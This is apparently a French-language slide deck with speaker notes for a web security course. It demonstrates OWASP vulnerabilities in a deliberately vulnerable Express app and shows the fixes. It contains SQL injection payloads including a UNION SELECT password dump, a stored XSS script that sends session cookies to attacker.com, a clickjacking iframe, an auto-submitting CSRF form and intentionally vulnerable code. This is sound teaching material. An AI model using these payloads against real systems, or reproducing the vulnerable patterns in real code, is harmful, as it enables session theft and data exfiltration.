A02

Security Misconfiguration

CORS & Headers HTTP

Ouvrir les DevTools → onglet Réseau → inspecter une réponse HTTP. Montrer X-Powered-By: Express et l'absence de CSP, X-Frame-Options.

Les headers HTTP de sécurité

Le serveur envoie des directives au navigateur
pour restreindre les comportements dangereux.

  • Quelles ressources charger ? → Content-Security-Policy
  • Autoriser les iframes ? → X-Frame-Options
  • Forcer HTTPS ? → Strict-Transport-Security
  • Révéler la stack ? → X-Powered-By
Ces headers sont des directives au navigateur, PAS des protections serveur. Le navigateur peut les ignorer (extensions, navigateur modifié). C'est de la défense en profondeur.

Ce que voit un attaquant

❌ Sans protection


HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html

(pas de CSP)
(pas de X-Frame-Options)
(pas de HSTS)

✅ Avec helmet()


HTTP/1.1 200 OK
Content-Security-Policy: ...
X-Frame-Options: SAMEORIGIN
Strict-Transport-Security: ...
X-Content-Type-Options: nosniff
Referrer-Policy: no-referrer
Faire la démo en live : Envoyer une requête dans Postman, montrer les headers AVANT et APRÈS correction.

CORS — Cross-Origin Resource Sharing

Sans configuration, cors() autorise toutes les origines.

❌ Trop permissif


app.use(cors());
// → Access-Control-Allow-Origin: *

✅ Restrictif


app.use(cors({
  origin: 'https://monsite.com',
  credentials: true,
}));

Un site tiers pourrait faire des requêtes authentifiées
au nom de l'utilisateur si CORS est trop ouvert.

CORS n'est pas un problème pour des APIs publiques, mais c'est dangereux pour une API qui utilise des cookies d'authentification.

Correction — helmet()


import helmet from 'helmet';
import cors from 'cors';

app.use(helmet());
app.use(cors({
  origin: process.env.FRONTEND_URL,
  credentials: true,
}));

helmet() ajoute ~11 headers de sécurité en une seule ligne.

Ce que helmet() ajoute

Header Protection
Content-Security-Policy Quelles ressources charger (anti-XSS)
X-Frame-Options Anti-clickjacking
X-Content-Type-Options Pas de MIME sniffing
Strict-Transport-Security Force HTTPS (180 jours)
Referrer-Policy Pas de fuite d'URLs internes
X-Powered-By Supprimé (masque la stack)

Démo — Clickjacking


<!-- Sans helmet : l'iframe fonctionne -->
<iframe src="http://localhost:5000"
        style="opacity: 0.01; position: absolute;">
</iframe>
<button>Cliquez ici pour gagner !</button>

L'utilisateur croit cliquer sur le bouton…
mais il clique dans l'iframe invisible. 😱

Avec X-Frame-Options: SAMEORIGIN → iframe bloquée ✅

Montrer qu'un iframe src="http://localhost:5000" fonctionne sans helmet. Après correction, la même iframe est bloquée. Bonne démonstration du clickjacking.

A05

SQL Injection

La faille la plus classique

Comment ça marche ?

L'attaquant injecte du code SQL dans un champ de saisie
pour modifier la logique de la requête.

📝 Champ email
' OR '1'='1'; --
→
🔧 Concaténation
dans la requête SQL
→
💥 La condition
est toujours vraie
→
🔓 Accès au
premier utilisateur
Demander au groupe : "Que se passe-t-il si email vaut ' OR '1'='1' -- ?" Laisser le temps de réfléchir avant de montrer.

Le code vulnérable


//! VULNERABLE — A05 : SQL Injection
const query = `SELECT * FROM users
  WHERE email = '${email}'
  AND password = '${password}'`;

const result = db.run(query);

Les valeurs de l'utilisateur sont directement
insérées dans la chaîne SQL ! 💀

Le payload d'attaque


{
  "email": "' OR '1'='1'; --",
  "password": "123secret"
}

Requête résultante :


SELECT * FROM users
WHERE email = '' OR '1'='1'; --' AND password = '...'
--                  ^^^^^^^^^^  ^^
--              toujours vrai    commente le reste

→ Retourne le premier utilisateur de la table

Montrer la requête résultante au tableau. Expliquer que -- commente tout ce qui suit. Le password "123secret" est nécessaire car il y a un check JS après le SQL (user.password !== password). C'est un bon exemple de "défense accidentelle".

Démo — Postman

  1. Ouvrir Auth / Login dans Postman
  2. Le payload d'injection est déjà configuré
  3. Envoyer → HTTP 200 + token JWT

L'attaquant s'est authentifié sans connaître aucun email ! 😱

Correction — Requêtes paramétrées


//* SECURE — Drizzle ORM (prepared statements)
import { eq } from 'drizzle-orm';
import { usersTable } from '@/db/schemas/user.schema.js';

const result = await db
  .select()
  .from(usersTable)
  .where(eq(usersTable.email, email));

// La valeur n'est JAMAIS interpolée dans le SQL
// Elle est transmise comme paramètre lié (?)

L'ORM génère : SELECT * FROM users WHERE email = ?
La valeur est envoyée séparément → injection impossible ✅

Montrer la requête générée dans les logs serveur. Drizzle génère des prepared statements — la valeur n'est jamais interpolée, elle est transmise comme paramètre lié.

Et la validation Zod ?

❌ Starter


z.string()
// Accepte n'importe quoi

✅ Mieux


z.string().email()
// Bloque les payloads SQLi

⚠️ La validation du format est une première ligne de défense,
mais elle ne remplace pas les requêtes paramétrées.

Un payload peut respecter le format email
et contenir du SQL : user@sub').union...

Pour aller plus loin — UNION SELECT


-- Exfiltration de TOUTE la table users
' UNION SELECT 1, email, password FROM users --

C'est la technique qu'un vrai attaquant utiliserait
pour extraire toute la base, pas juste bypasser l'auth.

Pourquoi z.string().email() ne suffit pas
à protéger contre l'injection SQL ?

Un attaquant peut construire un payload

A04

Cryptographic Failures

Mots de passe en clair

Le problème

Même si l'injection SQL est corrigée…

Une fuite de la base expose tous les mots de passe :

  • Sauvegarde S3 mal configurée
  • Dump accidentel
  • Vulnérabilité serveur

Si les mots de passe sont en clair → game over 💀

Commencer par la démo SQLite Viewer : ouvrir local.db et montrer les mots de passe lisibles directement.

Plaintext vs Hash vs Hash+Salt

Stockage Valeur en base Résistance
En clair 123secret ❌ Lisible directement
Hash simple a1b2c3d4... ⚠️ Rainbow table
Hash + Salt $argon2id$... ✅ Résistant

argon2 — 3 concepts

  1. Hachage — fonction à sens unique
    Impossible de retrouver 123secret depuis $argon2id$v=19$m=4096,t=3,p=1$...
  2. Salt — valeur aléatoire unique par hash
    Même mot de passe → hashes différents. Protège contre les rainbow tables.
  3. Cost factor — rend le hash plus lent à calculer

Code vulnérable


//! VULNERABLE — A04 : mots de passe en clair
// seed.ts
await db.insert(usersTable).values({
  email: 'john.doe@example.com',
  password: '123secret', // ← en clair !
});

// auth.router.ts — comparaison en clair
if (user.password !== password) {
  throw new UnauthorizedError('Invalid credentials');
}

Correction — argon2


import argon2 from 'argon2';

// Au seeding
const hashedPassword = await argon2.hash('123secret');
await db.insert(usersTable).values({
  email: 'john.doe@example.com',
  password: hashedPassword,
});

// À l'authentification
const isValid = await argon2.verify(
  user.password
  plaintextPassword,
);

Ne jamais re-hasher pour comparer !
argon2.verify() gère le salt automatiquement ✅

❓ Quiz — Cryptographie

Pourquoi deux appels à argon2.hash("123secret")
produisent-ils des hashes différents ?

Parce que argon2 génère un salt aléatoire unique
à chaque appel, intégré dans le hash lui-même.

C'est ce qui empêche les attaques par rainbow table.

A07

Bruteforce & Rate Limiting

Limiter les tentatives d'authentification

Bruteforce vs Credential Stuffing

Bruteforce

Tester toutes les combinaisons possibles

aaa, aab, aac…
Très lent, taux de succès faible

Credential Stuffing

Rejouer des couples email/mdp issus de fuites de données

Beaucoup d'utilisateurs réutilisent leurs mots de passe → taux bien plus élevé

Démo — Bruteforce sans protection


$ node starter/brute-force-demo.mjs
    

Tentative  1 → HTTP 401
Tentative  2 → HTTP 401
Tentative  3 → HTTP 401
...
Tentative 10 → HTTP 401
# Jamais de 429 → aucune limite !

Un vrai attaquant envoie des millions de requêtes,
en parallèle, depuis plusieurs IPs.

Lancer le script en live. Les 10 réponses HTTP 401 illustrent l'absence de protection.

Correction — Rate Limiting


import { createRateLimiter }
  from '@/middlewares/rate-limit.middleware.js';

const loginRateLimiter = createRateLimiter(
  5,               // max 5 tentatives
  15 * 60 * 1000,  // par fenêtre de 15 minutes
);

router.post('/login',
  loginRateLimiter,  // ← middleware de protection
  validate(loginSchema),
  async (req, res) => { /* ... */ }
);

Après 5 échecs → HTTP 429 Too Many Requests ✅

Limites et défenses complémentaires

Le rate limiting par IP est contournable (botnets).

  • CAPTCHA après N échecs
  • Verrouillage de compte temporaire
  • Alerte email à l'utilisateur
  • Authentification multi-facteur (MFA)

💡 argon2.verify() prend toujours le même temps (protection timing attack).

Timing attack : si la comparaison était instantanée pour un email inconnu mais lente pour un email connu, un attaquant pourrait énumérer les emails valides.

Fichiers : rate-limit.middleware.ts · auth.router.ts

A05

Cross-Site Scripting (XSS)

Injection de code JavaScript malveillant

Les 3 types de XSS

Type Mécanisme Persistance
Stocké Payload sauvegardé en base,
servi à tous les visiteurs		 Permanent
Réfléchi Payload dans l'URL,
exécuté si la victime clique		 Ponctuel
DOM-based Injecté via JS côté client,
sans passer par le serveur		 Côté client
La démo utilise un XSS stocké. C'est le plus dangereux car il touche tous les visiteurs.

Schéma d'attaque — XSS Stocké

🧑‍💻 Attaquant
Poste un commentaire
contenant <script>
→
🗄️ Base de données
Le script est
stocké tel quel
→
🌐 Serveur
Renvoie le contenu
sans échapper
→
👤 Victime
Le navigateur
exécute le script

Scénario réaliste

Au lieu d'un simple alert()…


<script>
  document.location =
    'https://attacker.com/steal?c=' + document.cookie
</script>

Ce commentaire exfiltre le cookie de session
de chaque visiteur vers un serveur attaquant.

Si le cookie n'a pas HttpOnly →
l'attaquant récupère une session valide sans connaître le mot de passe

Code vulnérable


//! VULNERABLE — A05 : XSS (pas d'échappement HTML)
const html = comments
  .map((c) => `<p>${c.content}</p>`)
  .join('');

res.send(html);
// Si c.content = "<script>alert('XSS')</script>"
// → le navigateur exécute le script !

Correction — Échappement HTML


//* SECURE
import escape from 'escape-html';

const html = comments
  .map((c) => `<p>${escape(c.content)}</p>`)
  .join('');

// escape() convertit :
// < → &lt;   > → &gt;   " → &quot;   ' → &#39;

Résultat : &lt;script&gt;alert('XSS')&lt;/script&gt;

Le tag est rendu inoffensif → affiché comme texte ✅

Lien avec l'étape 1 — CSP

Content-Security-Policy peut bloquer
l'exécution de scripts inline.

C'est une défense en profondeur :

  • L'échappement empêche l'injection
  • CSP bloque l'exécution si l'échappement est oublié
  • Les deux couches sont indépendantes
CSP ne remplace pas l'échappement : un XSS dans un attribut HTML peut exfiltrer des données sans JavaScript (CSS injection, exfiltration via attributs).

CSRF

Cross-Site Request Forgery

Le principe

Le navigateur envoie automatiquement les cookies
avec chaque requête vers un domaine.

Un site malveillant peut déclencher des actions
au nom d'un utilisateur authentifié.

Schéma d'attaque

1️⃣ L'utilisateur est
connecté à localhost:5000
(cookie actif)
→
2️⃣ Il visite
attack.html
(site malveillant)
→
3️⃣ Formulaire
auto-soumis vers
localhost:5000
→
4️⃣ Le navigateur
joint les cookies
→ requête "légitime"

Le code de l'attaque


<!-- attack.html — formulaire auto-soumis -->
<form action="http://localhost:5000/api/v1/transfers"
      method="POST">
  <input type="hidden" name="amount" value="1000" />
</form>
<script>document.forms[0].submit();</script>

Le transfert est exécuté sans que
l'utilisateur ait rien fait ! 💸

Ouvrir starter/attack.html directement dans un navigateur. Le formulaire se soumet automatiquement vers localhost:5000.

Double Submit Cookie Pattern

  1. Le serveur génère un token CSRF
  2. Il l'envoie dans un cookie ET dans le formulaire
  3. À chaque POST, le serveur vérifie que les deux valeurs correspondent

Un site tiers ne peut pas lire les cookies d'un autre domaine
(politique Same-Origin)
→ impossible de construire une requête valide ✅

Correction — Vérification du token


//* SECURE — CSRF Double Submit Cookie
const tokenFromBody = req.body.csrf;
const tokenFromCookie = req.signedCookies.csrf;

if (tokenFromBody !== tokenFromCookie) {
  throw new ForbiddenError('Invalid CSRF token');
}

// Le site légitime peut lire son propre cookie
// Un site tiers ne le peut pas → attaque bloquée

Défense complémentaire — SameSite


res.cookie('session', value, {
  sameSite: 'strict', // ← bloque l'envoi cross-origin
});
  • SameSite=Strict — aucun envoi cross-origin
  • SameSite=Lax — envoi uniquement pour les navigations top-level (dans la barre d'adresse)
  • SameSite=None — envoi partout (⚠️ nécessite Secure sinon le cookie ne sera pas envoyé)
SameSite=Strict est puissant mais récent. Ne pas compter dessus comme seule protection si le support navigateur doit être large. Les APIs JSON sont naturellement plus résistantes (Content-Type: application/json ne peut pas être envoyé par un formulaire HTML).

❓ Quiz — CSRF

Pourquoi un site tiers ne peut-il pas reproduire
le Double Submit Cookie Pattern ?

À cause de la politique Same-Origin :
un site tiers ne peut pas lire les cookies d'un autre domaine.

Il peut déclencher l'envoi du cookie, mais pas en lire la valeur
→ impossible de la dupliquer dans le formulaire.

A01

Broken Access Control

IDOR — Insecure Direct Object Reference

Authentification ≠ Autorisation

🔑 Authentification

Qui es-tu ?

Vérifier l'identité
(JWT valide, signature OK, non expiré)

🛡️ Autorisation

As-tu le droit ?

Vérifier les permissions
(cette ressource t'appartient-elle ?)

JWT prouve l'identité mais pas les droits d'accès !

C'est la vulnérabilité n°1 de l'OWASP Top 10 2025 — la plus répandue en production. Exemples réels : accès aux factures d'autres clients, messages privés, modification de commandes.

L'attaque IDOR

🔑 john.doe
se connecte
Token JWT (userId: 1)
→
📄 GET /users/1
✅ Ses données
→
📄 GET /users/2
❌ Données de jane !

Il suffit d'incrémenter l'ID dans l'URL
pour accéder aux données de n'importe qui.

Code vulnérable


//! VULNERABLE — A01 : pas de vérification d'accès
router.get('/:id', validate(userParamsSchema, 'params'),
  async (req, res) => {
    const { id } = req.params;

    // Pas d'authentification requise !
    // Pas de vérification que l'utilisateur
    // demande ses propres données !
    const user = await getUserById(id);
    res.json(user);
  }
);

Correction


//* SECURE — authentification + autorisation
import { requireAuth } from '@/middlewares/auth.middleware.js';
import { ForbiddenError } from '@/errors/index.js';

router.get('/:id', requireAuth,
  validate(userParamsSchema, 'params'),
  async (req, res) => {
    const { id } = req.params;

    if (req.user!.userId !== Number(id)) {
      throw new ForbiddenError(
        "You don't have permission"
      );
    }

    const user = await getUserById(id);
    res.json(user);
  }
);

Pour aller plus loin — RBAC

Role-Based Access Control


// Un admin peut accéder à tous les profils
if (!isAdmin(req.user) && req.user.userId !== id) {
  throw new ForbiddenError('Access denied');
}

Les rôles (admin, user, manager…) permettent
une gestion fine des permissions.

❓ Quiz — Access Control

Un token JWT valide garantit-il que l'utilisateur
a le droit d'accéder à la ressource ?

Non !

JWT = authentification (qui es-tu ?)
L'autorisation (as-tu le droit ?) est une vérification séparée
qui doit être implémentée dans chaque route.

A03

Audit & Analyse statique

Détecter les vulnérabilités sans exécuter le code

Deux outils complémentaires

pnpm audit SAST
Analyse Les dépendances tierces Votre propre code
Détecte CVE publiés Patterns dangereux
Exemple "express@4.18 a une faille" "cette concaténation SQL
est dangereuse"
Analogie : pnpm audit vérifie que les ingrédients ne sont pas rappelés. Le SAST vérifie que votre recette ne contient pas d'étapes dangereuses. Les deux sont nécessaires, aucun ne remplace la revue de code humaine.

pnpm audit


$ cd starter/backend
$ pnpm audit

# Corriger automatiquement
$ pnpm audit --fix

# En CI/CD : bloquer si vuln. high ou critical
$ pnpm audit --audit-level=high
Niveau Action
low Corriger à l'occasion
moderate Risque réel selon le contexte
high Corriger avant production
critical Bloquer le déploiement !
Bien distinguer dependencies (production) et devDependencies (build/dev). Une vulnérabilité en devDependency est moins critique. Ne pas paniquer face aux low/moderate.

SAST — Static Application Security Testing


Code source → Analyse des patterns → Rapport

"ligne 42 : cette concaténation SQL est dangereuse"
"ligne 87 : contenu utilisateur injecté sans échappement"

Détecte :

  • Requêtes SQL par concaténation
  • HTML sans échappement
  • Secrets hardcodés (const apiKey = "sk-...")
  • Fonctions dangereuses (eval(), exec())

⚠️ Ne détecte pas les failles logiques ni les vulnérabilités des dépendances.

Intégration CI/CD


# GitHub Actions
- name: Audit des dépendances
  run: pnpm audit --audit-level=high

- name: Analyse statique
  run: semgrep scan --config "p/javascript" src/ --error

Un pipeline qui échoue sur une vulnérabilité critique
force l'équipe à traiter la dette de sécurité avant le merge.

❓ Quiz — Audit

Qu'est-ce qu'un CVE ?

Common Vulnerabilities and Exposures

Identifiant public unique pour une vulnérabilité connue
(ex. CVE-2024-12345).
pnpm audit compare les dépendances contre cette base.

🛡️ Bonnes pratiques

Principes, outils et checklist

3 principes fondamentaux

  1. Validate all input
    Ne jamais faire confiance aux données de l'utilisateur.
    Valider le type, le format, la longueur.
  2. Least privilege
    Accorder uniquement les permissions nécessaires.
    Pas d'accès admin par défaut.
  3. Defense in depth
    Plusieurs couches de protection indépendantes.
    Si une couche tombe, les autres tiennent.

✅ Checklist développeur

  • ☐ Headers de sécurité configurés (helmet)
  • ☐ CORS restreint à l'origine autorisée
  • ☐ Requêtes SQL paramétrées (ORM ou prepared statements)
  • ☐ Mots de passe hashés (argon2, argon2)
  • ☐ Rate limiting sur les routes sensibles
  • ☐ Échappement HTML systématique
  • ☐ Tokens CSRF sur les formulaires
  • ☐ Contrôle d'accès sur chaque route
  • ☐ Cookies sécurisés (HttpOnly, SameSite, Secure)
  • ☐ Audit des dépendances en CI/CD
